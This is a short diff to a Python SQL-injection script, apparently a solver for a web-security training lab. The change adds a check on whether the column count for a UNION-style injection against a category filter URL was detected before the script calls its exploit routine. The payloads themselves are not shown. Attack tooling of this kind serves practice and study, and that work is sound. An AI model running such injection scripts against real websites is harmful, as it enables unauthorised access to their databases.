@@ -41,10 +41,13 @@ if __name__ == "__main__":
 
     url = f'{host}/filter?category=Accessories'
     num_columns = get_num_columns(url)
-    print(f'[+] Detected {num_columns} columns')
+    if num_columns:
+        print(f'[+] Detected {num_columns} columns')
 
-    string_column = exploit(url, num_columns, unique_string)
-    if string_column:
-        print(f'[+] Injection successful, string column found at position {string_column}')
+        string_column = exploit(url, num_columns, unique_string)
+        if string_column:
+            print(f'[+] Injection successful, string column found at position {string_column}')
+        else:
+            print('[-] Injection not successful')
     else:
-        print('[-] Injection not successful')
+        print('[-] Did not detect column count')
